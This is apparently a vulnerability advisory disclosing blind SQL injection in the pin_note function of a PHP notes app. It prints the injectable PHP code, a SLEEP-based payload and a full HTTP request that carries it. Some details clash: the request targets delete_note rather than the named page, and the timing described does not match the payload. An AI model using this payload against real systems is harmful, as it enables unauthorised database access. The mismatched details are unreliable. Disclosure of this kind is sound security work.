## Vulnerability Details

**Credits**: 
> Reigz Macolor (https://github.com/reigz/)<br/>

**Tested On**:
> [Notes App using PHP (OOP), jQuery, and Bootstrap 1.0](https://www.sourcecodester.com/php/16055/notes-app-using-php-oop-jquery-and-bootstrap-free-source-code.html) <br/>

**Affected Version**:
> Notes App using PHP (OOP), jQuery, and Bootstrap 1.0

**Affected Site Page**: 
> /ajax-api.php?action=pin_note<br/>

**Affected Code**: 
> </ajax-api.php [CLASS pin_note()]> <br/>

```php
function pin_note(){
        extract($_POST);
        $is_pinned = $pinned == 1 ? 0: 1;
        $sql = "UPDATE `notes` set `pinned` = '{$is_pinned}' where `id` = '{$id}'";
        $update  = $this->conn->query($sql);
        if($update){
            $resp['status'] = "success";
            if($is_pinned == 0){
                $_SESSION['message']['success'] = "Note has been unpinned.";
            }else{
                $_SESSION['message']['success'] = "Note has been pinned to top.";
            }
        }else{
            $resp['status'] = "error";
        }
        return json_encode($resp);
    }
```

**Related CWE:**
> [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)

## **Details:**
> Allows SQL Injection by placing untrusted code executing a query on the backend, triggering backend functions such as `sleep`.

Execute sleep query using payload `1337'+or+1=(SELECT+SLEEP(5))--+` via the `id` parameter.

```http 
POST /php-notes/ajax-api.php?action=delete_note HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 18

id=1337'+or+1=(SELECT+SLEEP(5))--+or+1=1--+&pin_note=0
```

> See resoponse matches the sleep time (n+1 min), triggering a blind SQL Injection.

![image](https://github.com/smurf-reigz/security/assets/48426940/a1da22d3-e3f0-4aeb-8482-eea1a86cc0be)

## **Vulnerability Impact:**
> As an attacker, can do the following:
> 1. Run any database query and have same permission as the web application (default for this Web Application is root).
